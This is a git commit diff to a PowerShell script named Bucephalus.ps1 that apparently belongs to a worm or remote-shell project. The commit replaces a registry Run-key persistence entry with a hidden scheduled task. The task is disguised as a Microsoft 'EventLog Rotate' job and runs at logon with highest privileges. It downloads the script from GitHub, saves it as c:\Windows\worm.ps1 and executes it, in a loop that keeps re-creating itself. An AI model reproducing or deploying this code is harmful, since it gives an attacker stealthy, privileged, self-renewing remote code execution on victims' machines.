1b4425897ff4db4ec889544005d8873d4b40454c
Anthony Magrene <ekfhalomaster@gmail.com>
2021-02-03 22:13:00 -0500

    Update Bucephalus.ps1

--- Bucephalus.ps1
+++ Bucephalus.ps1
@@ -100,13 +100,17 @@ start-job -ScriptBlock{
 start-job -ScriptBlock { 
     while(1 -eq 1){
         try{
-            New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-expression { invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 }' -NonInteractive -ExecutionPolicy Bypass"  -PropertyType "String"
+            Unregister-ScheduledTask -taskname 'EventLog Rotate'
         
         }
         catch{
-            Set-Itemproperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Incitatus" -Value "C:\system32\WindowsPowerShell\v1.0\powershell.exe -Command 'invoke-expression { invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 }' -NonInteractive -ExecutionPolicy Bypass"
+            $action = @()
+            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\worm.ps1'
+            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "c:\Windows\worm.ps1"'
+            $trigger = New-ScheduledTaskTrigger -AtLogon
+            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotate" -Description "Daily rotation of event logs" -RunLevel Highest -TaskPath \Microsoft\Windows\SpacePort
         }
-        start-sleep -Seconds (get-random -Minimum 5 -Maximum 10)
+        start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
     }
 }
 
